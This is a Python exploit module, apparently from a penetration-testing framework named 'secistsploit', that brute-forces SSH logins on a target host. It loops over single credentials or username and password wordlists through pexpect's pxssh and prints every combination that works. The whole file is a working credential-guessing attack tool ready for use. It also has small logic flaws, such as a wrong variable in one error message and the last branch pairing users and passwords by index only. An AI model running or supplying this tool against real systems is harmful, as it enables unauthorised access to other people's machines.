from pexpect import pxssh
import os
from secistsploit.core.exploit import *
from secistsploit.core.tcp.tcp_client import TCPClient

class Exploit(TCPClient):
    __info__ = {
        "name": "ssh_login",
        "description": "ssh_login",
        "authors": (
            "jjiushi",
        ),
        "references": (
            "www.422926799.github.io"
            "www.422926799.github.io"
        ),

    }

    target = OptIP("", "Setting up IP")
    port = OptPort(22, "Target SSH port")
    username=OptString("root","Username")
    password=OptString("","password")
    userfile=OptString("","USERfile")
    passwordfile=OptString("","password,file")
    def __init__(self):
        self.endianness = "<"

    def run(self):
        rhost=(self.target)
        rport=(self.port)
        username=(self.username)
        password=(self.password)
        userfile=(self.userfile)
        passwdfile=(self.passwordfile)
        print('[+] rhost:{}'.format(rhost))
        print('[+] rport {}'.format(rport))
        if username != '' and password=='' and passwdfile != '':
            if os.path.exists(passwdfile):
                print('[+] passwordfile:{} ok'.format(passwdfile))
            else:
                print('[-] {} Not Found'.format(passwdfile))

            dk = open(passwdfile, 'r')
            for p in dk.readlines():
                qc = "".join(p.split('\n'))
                try:
                    k = pxssh.pxssh()
                    k.login(rhost, username, qc, port=rport)
                    print('[+] username:{} password:{}'.format(username, qc))
                except:
                    print('[-] Not username:{} or password:{}'.format(username, qc))

        if username !='' and passwdfile=='' and password !='':
            try:
                s=pxssh.pxssh()
                s.login(rhost,username,password,port=rport)
                print('[+] username:{} password:{}'.format(username,password))
            except:
                print('[-] Not username:{} or password:{}'.format(username,password))

        if username=='' and userfile!='' and password!='':
            if os.path.exists(userfile):
                print('[+] userfile:{} ok'.format(userfile))
            else:
                print('[-] {} Not Found'.format(passwdfile))

            dk=open(userfile,'r')
            for u in dk.readlines():
                qc2="".join(u.split('\n'))
                try:
                    u=pxssh.pxssh()
                    u.login(rhost,qc2,password,port=rport)
                    print('[+] username:{} password:{}'.format(qc2,password))
                except:
                    print('[-] Not username:{} or password:{}'.format(qc2,password))

        if username=='' and password=='' and userfile!='' and passwdfile!='':
            users=[]
            pawds=[]
            if os.path.exists(userfile):
                print('[+] userfile:{} ok'.format(userfile))
            else:
                print('[-] {} Not FOund'.format(userfile))

            if os.path.exists(passwdfile):
                print('[+] passwordfile:{}'.format(passwdfile))
            else:
                print('[-] {} Not Found'.format(passwdfile))

            dk=open(userfile,'r')
            for r in dk.readlines():
                qc="".join(r.split('\n'))
                users.append(qc)

            dk2=open(passwdfile,'r')
            for s in dk2.readlines():
                qc3="".join(s.split('\n'))
                pawds.append(qc3)

            for y in range(0,len(users)):
                try:
                    pw = pxssh.pxssh()
                    pw.login(rhost,users[y],pawds[y],port=rport)
                    print('[+] username:{} password:{}'.format(users[y],pawds[y]))
                except:
                    print('[-] username:{} password:{}'.format(users[y],pawds[y]))